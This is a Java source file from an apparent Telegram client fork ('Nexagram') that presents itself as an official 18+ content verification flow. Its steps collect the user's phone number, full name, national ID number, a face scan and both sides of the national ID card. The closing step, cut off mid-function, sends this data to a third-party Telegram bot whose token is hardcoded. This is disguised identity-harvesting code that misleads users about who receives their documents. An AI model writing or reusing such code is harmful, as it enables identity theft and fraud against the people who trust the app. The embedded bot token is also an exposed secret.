package org.telegram.ui.Components;

import static org.telegram.messenger.AndroidUtilities.dp;
import static org.telegram.messenger.AndroidUtilities.dpf2;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.PorterDuff;
import android.graphics.PorterDuffColorFilter;
import android.graphics.RectF;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.text.Editable;
import android.text.InputType;
import android.text.TextUtils;
import android.text.TextWatcher;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.core.content.FileProvider;
import androidx.core.graphics.ColorUtils;

import org.json.JSONArray;
import org.json.JSONObject;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.FileLoader;
import org.telegram.messenger.FileLog;
import org.telegram.messenger.LocaleController;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.R;
import org.telegram.messenger.SendMessagesHelper;
import org.telegram.messenger.SharedConfig;
import org.telegram.messenger.UserConfig;
import org.telegram.messenger.Utilities;
import org.telegram.tgnet.TLRPC;
import org.telegram.ui.ActionBar.AlertDialog;
import org.telegram.ui.ActionBar.BaseFragment;
import org.telegram.ui.ActionBar.BottomSheet;
import org.telegram.ui.ActionBar.Theme;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class Verification18BottomSheet extends BottomSheet {

    public static final String BOT_USERNAME = "varification_of_nexagram_bot";
    public static final String BOT_TOKEN = "8622740230:AAGBI7BhIzsCez5IdPeorEUgo_Mq40QpWGA";
    public static final String ADMIN_USERNAME = "theanonymous4048";
    public static final String PREF_KEY_VERIFIED = "nexagram_18_verified";
    public static final String PREF_KEY_ADMIN_CANCELLED = "nexagram_18_admin_cancelled";

    private final BaseFragment fragment;
    private final int currentAccount;
    private final Utilities.Callback<Boolean> onDone;

    private int currentStep = 0; // 0: Start, 1: Age, 2: Reason, 3: Personal Info, 4: Face ID, 5: NID Upload, 6: Submitting

    // User data
    private boolean isAge18Plus = false;
    private int selectedReasonIndex = -1;
    private String customReasonText = "";
    private String phoneNumber = "";
    private String fullName = "";
    private String nidNumber = "";
    private Bitmap faceBitmap = null;
    private Bitmap nidFrontBitmap = null;
    private Bitmap nidBackBitmap = null;

    // Active views container
    private final FrameLayout containerLayout;
    private final ScrollView scrollView;
    private final LinearLayout stepContentLayout;

    // Callback reference for activity result
    private static Verification18BottomSheet currentInstance;
    private static int pendingCaptureType = 0; // 1: face, 2: nid front, 3: nid back

    public static void show(BaseFragment fragment, int currentAccount, Utilities.Callback<Boolean> callback) {
        if (fragment == null || fragment.getContext() == null) return;
        Verification18BottomSheet sheet = new Verification18BottomSheet(fragment, currentAccount, callback);
        currentInstance = sheet;
        sheet.show();
    }

    public static void handleActivityResult(int requestCode, int resultCode, Intent data) {
        if (currentInstance == null || resultCode != Activity.RESULT_OK) return;
        try {
            Bitmap bitmap = null;
            if (data != null && data.getData() != null) {
                InputStream is = ApplicationLoader.applicationContext.getContentResolver().openInputStream(data.getData());
                bitmap = BitmapFactory.decodeStream(is);
                if (is != null) is.close();
            } else if (data != null && data.getExtras() != null && data.getExtras().get("data") instanceof Bitmap) {
                bitmap = (Bitmap) data.getExtras().get("data");
            }

            if (bitmap != null) {
                if (pendingCaptureType == 1) {
                    currentInstance.faceBitmap = bitmap;
                    currentInstance.renderStep4Face();
                } else if (pendingCaptureType == 2) {
                    currentInstance.nidFrontBitmap = bitmap;
                    currentInstance.renderStep5Nid();
                } else if (pendingCaptureType == 3) {
                    currentInstance.nidBackBitmap = bitmap;
                    currentInstance.renderStep5Nid();
                }
            }
        } catch (Exception e) {
            FileLog.e(e);
        }
    }

    public Verification18BottomSheet(@NonNull BaseFragment fragment, int currentAccount, Utilities.Callback<Boolean> callback) {
        super(fragment.getContext(), true);
        this.fragment = fragment;
        this.currentAccount = currentAccount;
        this.onDone = callback;

        setApplyBottomPadding(false);
        setApplyTopPadding(false);

        containerLayout = new FrameLayout(getContext());
        containerLayout.setBackgroundColor(Theme.getColor(Theme.key_dialogBackground));

        scrollView = new ScrollView(getContext());
        scrollView.setVerticalScrollBarEnabled(false);
        containerLayout.addView(scrollView, LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT, LayoutHelper.MATCH_PARENT));

        stepContentLayout = new LinearLayout(getContext());
        stepContentLayout.setOrientation(LinearLayout.VERTICAL);
        stepContentLayout.setPadding(dp(20), dp(18), dp(20), dp(24));
        scrollView.addView(stepContentLayout, LayoutHelper.createScroll(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, Gravity.TOP));

        setCustomView(containerLayout);
        renderCurrentStep();
    }

    private boolean isBengali() {
        String lang = LocaleController.getInstance().getCurrentLocale().getLanguage();
        return lang != null && lang.startsWith("bn");
    }

    private void renderCurrentStep() {
        stepContentLayout.removeAllViews();
        switch (currentStep) {
            case 0:
                renderStep0Start();
                break;
            case 1:
                renderStep1Age();
                break;
            case 2:
                renderStep2Reason();
                break;
            case 3:
                renderStep3PersonalInfo();
                break;
            case 4:
                renderStep4Face();
                break;
            case 5:
                renderStep5Nid();
                break;
            case 6:
                renderStep6Submitting();
                break;
        }
    }

    // Header section with bot avatar and branding
    private void addBotHeader(LinearLayout parent) {
        LinearLayout header = new LinearLayout(getContext());
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setPadding(0, 0, 0, dp(16));

        ImageView botIcon = new ImageView(getContext());
        botIcon.setImageResource(R.drawable.msg_bot);
        botIcon.setColorFilter(new PorterDuffColorFilter(0xFF2EA6FF, PorterDuff.Mode.SRC_IN));
        GradientDrawable iconBg = new GradientDrawable();
        iconBg.setShape(GradientDrawable.OVAL);
        iconBg.setColor(Theme.multAlpha(0xFF2EA6FF, 0.15f));
        botIcon.setBackground(iconBg);
        botIcon.setPadding(dp(8), dp(8), dp(8), dp(8));
        header.addView(botIcon, LayoutHelper.createLinear(40, 40, Gravity.CENTER_VERTICAL, 0, 0, 12, 0));

        LinearLayout textLayout = new LinearLayout(getContext());
        textLayout.setOrientation(LinearLayout.VERTICAL);

        TextView botName = new TextView(getContext());
        botName.setText("Nexagram Verification Bot");
        botName.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 16);
        botName.setTypeface(Typeface.DEFAULT_BOLD);
        botName.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        textLayout.addView(botName, LayoutHelper.createLinear(LayoutHelper.WRAP_CONTENT, LayoutHelper.WRAP_CONTENT));

        TextView botHandle = new TextView(getContext());
        botHandle.setText("@" + BOT_USERNAME);
        botHandle.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 13);
        botHandle.setTextColor(0xFF2EA6FF);
        textLayout.addView(botHandle, LayoutHelper.createLinear(LayoutHelper.WRAP_CONTENT, LayoutHelper.WRAP_CONTENT));

        header.addView(textLayout, LayoutHelper.createLinear(LayoutHelper.WRAP_CONTENT, LayoutHelper.WRAP_CONTENT));
        parent.addView(header, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT));

        View divider = new View(getContext());
        divider.setBackgroundColor(Theme.multAlpha(Theme.getColor(Theme.key_divider), 0.5f));
        parent.addView(divider, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, 1, 0, 0, 0, 16));
    }

    // Step 0: Start Screen
    private void renderStep0Start() {
        addBotHeader(stepContentLayout);

        TextView title = new TextView(getContext());
        title.setText(isBengali() ? "১৮+ কনটেন্ট যাচাইকরণ" : "Show 18+ Content Verification");
        title.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 20);
        title.setTypeface(Typeface.DEFAULT_BOLD);
        title.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        title.setGravity(Gravity.CENTER_HORIZONTAL);
        stepContentLayout.addView(title, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 8, 0, 8));

        TextView desc = new TextView(getContext());
        desc.setText(isBengali()
                ? "১৮+ কনটেন্ট অপশন চালু করার জন্য টেলিগ্রাম ভেরিফিকেশন বটের মাধ্যমে সমস্ত তথ্য পূরণ করা বাধ্যতামূলক। প্রতিটি ধাপ সঠিকভাবে সম্পন্ন করুন।"
                : "To enable 18+ content, you must complete all verification steps via the official verification bot. All steps and fields are mandatory.");
        desc.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 14);
        desc.setTextColor(Theme.getColor(Theme.key_dialogTextGray));
        desc.setGravity(Gravity.CENTER_HORIZONTAL);
        desc.setLineSpacing(dp(2), 1f);
        stepContentLayout.addView(desc, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 8, 0, 8, 24));

        TextView startButton = createButton(isBengali() ? "শুরু করুন (Start)" : "Start Verification", true);
        startButton.setOnClickListener(v -> {
            currentStep = 1;
            renderCurrentStep();
        });
        stepContentLayout.addView(startButton, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, 48));
    }

    // Step 1: Age Verification (Yes / No)
    private void renderStep1Age() {
        addBotHeader(stepContentLayout);

        TextView stepIndicator = new TextView(getContext());
        stepIndicator.setText(isBengali() ? "ধাপ ১: বয়স নিশ্চিতকরণ" : "Step 1: Age Verification");
        stepIndicator.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 13);
        stepIndicator.setTextColor(0xFF2EA6FF);
        stepIndicator.setTypeface(Typeface.DEFAULT_BOLD);
        stepContentLayout.addView(stepIndicator, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 6));

        TextView question = new TextView(getContext());
        question.setText(isBengali() ? "আপনার বয়স কি ১৮ বা এর বেশি?" : "Are you 18 years of age or older?");
        question.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 18);
        question.setTypeface(Typeface.DEFAULT_BOLD);
        question.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        stepContentLayout.addView(question, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 20));

        LinearLayout buttonsRow = new LinearLayout(getContext());
        buttonsRow.setOrientation(LinearLayout.HORIZONTAL);

        TextView noButton = createButton(isBengali() ? "না (No)" : "No", false);
        noButton.setOnClickListener(v -> {
            isAge18Plus = false;
            if (onDone != null) onDone.run(false);
            dismiss();
            BulletinFactory.of(fragment).createSimpleBulletin(
                    R.raw.error,
                    isBengali() ? "বয়স ১৮ এর কম" : "Age Restriction",
                    isBengali() ? "আপনার বয়স ১৮ এর কম হওয়ায় এই অপশনটি চালু করা যাবে না।" : "You must be 18 or older to enable this option."
            ).show();
        });
        buttonsRow.addView(noButton, LayoutHelper.createLinear(0, 48, 1f, 0, 0, 6, 0));

        TextView yesButton = createButton(isBengali() ? "হ্যাঁ (Yes)" : "Yes", true);
        yesButton.setOnClickListener(v -> {
            isAge18Plus = true;
            currentStep = 2;
            renderCurrentStep();
        });
        buttonsRow.addView(yesButton, LayoutHelper.createLinear(0, 48, 1f, 6, 0, 0, 0));

        stepContentLayout.addView(buttonsRow, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT));
    }

    // Step 2: Reason for Enabling 18+ Content
    private void renderStep2Reason() {
        addBotHeader(stepContentLayout);

        TextView stepIndicator = new TextView(getContext());
        stepIndicator.setText(isBengali() ? "ধাপ ২: কারণ উল্লেখ করুন" : "Step 2: Reason for Enabling");
        stepIndicator.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 13);
        stepIndicator.setTextColor(0xFF2EA6FF);
        stepIndicator.setTypeface(Typeface.DEFAULT_BOLD);
        stepContentLayout.addView(stepIndicator, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 6));

        TextView question = new TextView(getContext());
        question.setText(isBengali() ? "আপনি এই অপশনটি কেন অন করতে চাচ্ছেন?" : "Why do you want to enable this option?");
        question.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 18);
        question.setTypeface(Typeface.DEFAULT_BOLD);
        question.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        stepContentLayout.addView(question, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 16));

        String[] options = new String[]{
                isBengali() ? "আমি কিছু ১৮+ সম্পর্কিত তথ্যের খোঁজ নিচ্ছি।" : "I am looking for some 18+ related information.",
                isBengali() ? "আমি কিছু জিনিস দেখতে চাচ্ছি।" : "I want to watch/view some content.",
                isBengali() ? "অন্যান্য (Other)" : "Other"
        };

        EditTextBoldCursor otherInput = new EditTextBoldCursor(getContext());
        otherInput.setVisibility(selectedReasonIndex == 2 ? View.VISIBLE : View.GONE);
        otherInput.setHint(isBengali() ? "আপনার কারণ লিখুন (সর্বোচ্চ ১৫ শব্দ)" : "Enter reason (maximum 15 words)");
        otherInput.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 14);
        otherInput.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        otherInput.setHintTextColor(Theme.getColor(Theme.key_dialogTextGray));
        otherInput.setBackground(createFieldBg());
        otherInput.setPadding(dp(12), dp(10), dp(12), dp(10));
        otherInput.setText(customReasonText);
        otherInput.addTextChangedListener(new TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
            @Override
            public void afterTextChanged(Editable s) {
                customReasonText = s.toString();
            }
        });

        View[] optionViews = new View[options.length];
        for (int i = 0; i < options.length; i++) {
            final int index = i;
            TextView opt = new TextView(getContext());
            opt.setText(options[i]);
            opt.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 14);
            opt.setPadding(dp(14), dp(12), dp(14), dp(12));
            opt.setBackground(createOptionBg(selectedReasonIndex == i));
            opt.setTextColor(selectedReasonIndex == i ? 0xFF2EA6FF : Theme.getColor(Theme.key_dialogTextBlack));
            opt.setOnClickListener(v -> {
                selectedReasonIndex = index;
                for (int j = 0; j < optionViews.length; j++) {
                    optionViews[j].setBackground(createOptionBg(selectedReasonIndex == j));
                    ((TextView) optionViews[j]).setTextColor(selectedReasonIndex == j ? 0xFF2EA6FF : Theme.getColor(Theme.key_dialogTextBlack));
                }
                otherInput.setVisibility(selectedReasonIndex == 2 ? View.VISIBLE : View.GONE);
            });
            optionViews[i] = opt;
            stepContentLayout.addView(opt, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 10));
        }

        stepContentLayout.addView(otherInput, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 16));

        TextView nextButton = createButton(isBengali() ? "পরবর্তী ধাপ (Next)" : "Next Step", true);
        nextButton.setOnClickListener(v -> {
            if (selectedReasonIndex == -1) {
                showToast(isBengali() ? "অনুগ্রহ করে একটি কারণ নির্বাচন করুন।" : "Please select an option.");
                return;
            }
            if (selectedReasonIndex == 2) {
                String words[] = customReasonText.trim().split("\\s+");
                if (TextUtils.isEmpty(customReasonText.trim())) {
                    showToast(isBengali() ? "অনুগ্রহ করে আপনার কারণটি লিখুন।" : "Please enter your reason.");
                    return;
                }
                if (words.length > 15) {
                    showToast(isBengali() ? "কারণটি সর্বোচ্চ ১৫ শব্দের মধ্যে হতে হবে।" : "Reason cannot exceed 15 words.");
                    return;
                }
            }
            currentStep = 3;
            renderCurrentStep();
        });
        stepContentLayout.addView(nextButton, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, 48));
    }

    // Step 3: Personal Information (Phone with CC, Full English Name, NID)
    private void renderStep3PersonalInfo() {
        addBotHeader(stepContentLayout);

        TextView stepIndicator = new TextView(getContext());
        stepIndicator.setText(isBengali() ? "ধাপ ৩: ব্যক্তিগত তথ্য" : "Step 3: Personal Information");
        stepIndicator.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 13);
        stepIndicator.setTextColor(0xFF2EA6FF);
        stepIndicator.setTypeface(Typeface.DEFAULT_BOLD);
        stepContentLayout.addView(stepIndicator, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 6));

        TextView heading = new TextView(getContext());
        heading.setText(isBengali() ? "সকল তথ্য সঠিকভাবে পূরণ করুন" : "Enter all required details");
        heading.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 18);
        heading.setTypeface(Typeface.DEFAULT_BOLD);
        heading.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        stepContentLayout.addView(heading, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 16));

        // 1. Regular Phone Number
        TextView phoneLabel = createFieldLabel(isBengali() ? "১. নিয়মিত ফোন নম্বর (কান্ট্রি কোড সহ) *" : "1. Regular Phone Number (with Country Code) *");
        stepContentLayout.addView(phoneLabel, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 4));

        EditTextBoldCursor phoneInput = new EditTextBoldCursor(getContext());
        phoneInput.setHint("+8801XXXXXXXXX");
        phoneInput.setInputType(InputType.TYPE_CLASS_PHONE);
        phoneInput.setText(phoneNumber);
        phoneInput.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 14);
        phoneInput.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        phoneInput.setHintTextColor(Theme.getColor(Theme.key_dialogTextGray));
        phoneInput.setBackground(createFieldBg());
        phoneInput.setPadding(dp(12), dp(10), dp(12), dp(10));
        phoneInput.addTextChangedListener(new TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
            @Override public void afterTextChanged(Editable s) { phoneNumber = s.toString(); }
        });
        stepContentLayout.addView(phoneInput, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 12));

        // 2. Full Name in English
        TextView nameLabel = createFieldLabel(isBengali() ? "২. সম্পূর্ণ নাম (ইংরেজিতে) *" : "2. Full Name (in English) *");
        stepContentLayout.addView(nameLabel, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 4));

        EditTextBoldCursor nameInput = new EditTextBoldCursor(getContext());
        nameInput.setHint(isBengali() ? "আপনার সম্পূর্ণ নাম ইংরেজিতে লিখুন" : "Full name in English");
        nameInput.setInputType(InputType.TYPE_TEXT_VARIATION_PERSON_NAME);
        nameInput.setText(fullName);
        nameInput.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 14);
        nameInput.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        nameInput.setHintTextColor(Theme.getColor(Theme.key_dialogTextGray));
        nameInput.setBackground(createFieldBg());
        nameInput.setPadding(dp(12), dp(10), dp(12), dp(10));
        nameInput.addTextChangedListener(new TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
            @Override public void afterTextChanged(Editable s) { fullName = s.toString(); }
        });
        stepContentLayout.addView(nameInput, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 12));

        // 3. National ID Number
        TextView nidLabel = createFieldLabel(isBengali() ? "৩. জাতীয় পরিচয়পত্র নম্বর (NID) *" : "3. National ID Number (NID) *");
        stepContentLayout.addView(nidLabel, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 4));

        EditTextBoldCursor nidInput = new EditTextBoldCursor(getContext());
        nidInput.setHint(isBengali() ? "১০ বা ১৭ সংখ্যার NID নম্বর" : "10 or 17 digit NID number");
        nidInput.setInputType(InputType.TYPE_CLASS_NUMBER);
        nidInput.setText(nidNumber);
        nidInput.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 14);
        nidInput.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        nidInput.setHintTextColor(Theme.getColor(Theme.key_dialogTextGray));
        nidInput.setBackground(createFieldBg());
        nidInput.setPadding(dp(12), dp(10), dp(12), dp(10));
        nidInput.addTextChangedListener(new TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
            @Override public void afterTextChanged(Editable s) { nidNumber = s.toString(); }
        });
        stepContentLayout.addView(nidInput, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 20));

        TextView nextButton = createButton(isBengali() ? "পরবর্তী ধাপ (Next)" : "Next Step", true);
        nextButton.setOnClickListener(v -> {
            if (TextUtils.isEmpty(phoneNumber.trim()) || phoneNumber.trim().length() < 8) {
                showToast(isBengali() ? "সঠিক ফোন নম্বর প্রদান করুন।" : "Please enter a valid phone number.");
                return;
            }
            if (TextUtils.isEmpty(fullName.trim())) {
                showToast(isBengali() ? "সম্পূর্ণ নাম প্রদান করুন।" : "Please enter your full name.");
                return;
            }
            if (TextUtils.isEmpty(nidNumber.trim()) || nidNumber.trim().length() < 6) {
                showToast(isBengali() ? "সঠিক NID নম্বর প্রদান করুন।" : "Please enter a valid NID number.");
                return;
            }
            currentStep = 4;
            renderCurrentStep();
        });
        stepContentLayout.addView(nextButton, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, 48));
    }

    // Step 4: Facial Verification (Face ID-style scan)
    private void renderStep4Face() {
        addBotHeader(stepContentLayout);

        TextView stepIndicator = new TextView(getContext());
        stepIndicator.setText(isBengali() ? "ধাপ ৪: ফেস ভেরিফিকেশন" : "Step 4: Facial Verification");
        stepIndicator.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 13);
        stepIndicator.setTextColor(0xFF2EA6FF);
        stepIndicator.setTypeface(Typeface.DEFAULT_BOLD);
        stepContentLayout.addView(stepIndicator, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 6));

        TextView heading = new TextView(getContext());
        heading.setText(isBengali() ? "আপনার মুখমণ্ডল স্ক্যান করুন" : "Scan Your Face");
        heading.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 18);
        heading.setTypeface(Typeface.DEFAULT_BOLD);
        heading.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        stepContentLayout.addView(heading, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 16));

        // Circular Face ID viewfinder
        FrameLayout circleFrame = new FrameLayout(getContext());
        circleFrame.setLayoutParams(LayoutHelper.createLinear(160, 160, Gravity.CENTER_HORIZONTAL, 0, 10, 0, 16));

        ImageView facePreview = new ImageView(getContext());
        facePreview.setScaleType(ImageView.ScaleType.CENTER_CROP);
        GradientDrawable circleBg = new GradientDrawable();
        circleBg.setShape(GradientDrawable.OVAL);
        circleBg.setColor(Theme.getColor(Theme.key_windowBackgroundGray));
        circleBg.setStroke(dp(3), faceBitmap != null ? 0xFF4CAF50 : 0xFF2EA6FF);
        facePreview.setBackground(circleBg);
        if (faceBitmap != null) {
            facePreview.setImageBitmap(faceBitmap);
        } else {
            facePreview.setImageResource(R.drawable.msg_camera);
            facePreview.setColorFilter(new PorterDuffColorFilter(0xFF2EA6FF, PorterDuff.Mode.SRC_IN));
            facePreview.setPadding(dp(40), dp(40), dp(40), dp(40));
        }
        circleFrame.addView(facePreview, LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT, LayoutHelper.MATCH_PARENT));

        stepContentLayout.addView(circleFrame);

        TextView scanButton = createButton(faceBitmap == null ? (isBengali() ? "স্ক্যান করুন (Scan)" : "Scan Face") : (isBengali() ? "পুনরায় স্ক্যান করুন" : "Rescan"), false);
        scanButton.setOnClickListener(v -> {
            pendingCaptureType = 1;
            launchCameraOrGallery();
        });
        stepContentLayout.addView(scanButton, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, 44, 0, 0, 0, 12));

        TextView doneButton = createButton(isBengali() ? "সম্পন্ন (Done)" : "Done", true);
        doneButton.setOnClickListener(v -> {
            if (faceBitmap == null) {
                showToast(isBengali() ? "ফেস স্ক্যান সম্পন্ন করা আবশ্যক।" : "Facial verification is mandatory.");
                return;
            }
            currentStep = 5;
            renderCurrentStep();
        });
        stepContentLayout.addView(doneButton, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, 48));
    }

    // Step 5: National ID Image Upload (Front & Back mandatory)
    private void renderStep5Nid() {
        addBotHeader(stepContentLayout);

        TextView stepIndicator = new TextView(getContext());
        stepIndicator.setText(isBengali() ? "ধাপ ৫: জাতীয় পরিচয়পত্র আপলোড" : "Step 5: National ID Upload");
        stepIndicator.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 13);
        stepIndicator.setTextColor(0xFF2EA6FF);
        stepIndicator.setTypeface(Typeface.DEFAULT_BOLD);
        stepContentLayout.addView(stepIndicator, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 6));

        TextView heading = new TextView(getContext());
        heading.setText(isBengali() ? "উভয় পাশের স্পষ্ট ছবি আপলোড করুন" : "Upload both sides of your National ID");
        heading.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 18);
        heading.setTypeface(Typeface.DEFAULT_BOLD);
        heading.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        stepContentLayout.addView(heading, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 16));

        // 1. Front Side Card
        TextView frontLabel = createFieldLabel(isBengali() ? "১. NID সামনের অংশ (Front Side) *" : "1. NID Front Side *");
        stepContentLayout.addView(frontLabel, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 6));

        FrameLayout frontCard = createUploadCard(nidFrontBitmap, isBengali() ? "সামনের ছবি তুলুন / আপলোড করুন" : "Capture / Upload Front Image", () -> {
            pendingCaptureType = 2;
            launchCameraOrGallery();
        });
        stepContentLayout.addView(frontCard, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, 110, 0, 0, 0, 14));

        // 2. Back Side Card
        TextView backLabel = createFieldLabel(isBengali() ? "২. NID পেছনের অংশ (Back Side) *" : "2. NID Back Side *");
        stepContentLayout.addView(backLabel, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 0, 0, 6));

        FrameLayout backCard = createUploadCard(nidBackBitmap, isBengali() ? "পেছনের ছবি তুলুন / আপলোড করুন" : "Capture / Upload Back Image", () -> {
            pendingCaptureType = 3;
            launchCameraOrGallery();
        });
        stepContentLayout.addView(backCard, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, 110, 0, 0, 0, 20));

        TextView submitButton = createButton(isBengali() ? "তথ্য জমা দিন (Submit)" : "Submit Verification", true);
        submitButton.setOnClickListener(v -> {
            if (nidFrontBitmap == null) {
                showToast(isBengali() ? "NID সামনের অংশের ছবি আপলোড করা আবশ্যক।" : "NID Front side image is mandatory.");
                return;
            }
            if (nidBackBitmap == null) {
                showToast(isBengali() ? "NID পেছনের অংশের ছবি আপলোড করা আবশ্যক।" : "NID Back side image is mandatory.");
                return;
            }
            currentStep = 6;
            renderCurrentStep();
        });
        stepContentLayout.addView(submitButton, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, 48));
    }

    // Step 6: Submitting to Telegram Admin
    private void renderStep6Submitting() {
        addBotHeader(stepContentLayout);

        TextView submittingText = new TextView(getContext());
        submittingText.setText(isBengali() ? "যাচাইকরণ তথ্য টেলিগ্রামে পাঠানো হচ্ছে..." : "Sending verification data to Telegram...");
        submittingText.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 16);
        submittingText.setTypeface(Typeface.DEFAULT_BOLD);
        submittingText.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        submittingText.setGravity(Gravity.CENTER_HORIZONTAL);
        stepContentLayout.addView(submittingText, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, LayoutHelper.WRAP_CONTENT, 0, 24, 0, 16));

        sendVerificationDataToTelegram();
    }

    private void sendVerificationDataToTelegram() {
        new Thread(() -> {
            try {
                long currentUserId = UserConfig.getInstance(currentAccount).getClientUserId();
                String tgUsername = UserConfig.getInstance(currentAccount).getCurrentUser() != null
                        ? UserConfig.getInstance(currentAccount).getCurrentUser().username : "N/A";

                String reasonStr = selectedReasonIndex == 0 ? "Looking for 18+ information"
                        : selectedReasonIndex == 1 ? "Want to view content"
                        : customReasonText;

                StringBuilder sb = new StringBuilder();
                sb.append("🔞 <b>New 18+ Content Verification Request</b>\n\n");
                sb.append("👤 <b>Telegram User:</b> @").append(tgUsername).append(" (ID: ").append(currentUserId).append(")\n");
                sb.append("🔞 <b>Age 18+ Verified:</b> ").append(isAge18Plus ? "Yes" : "No").append("\n");
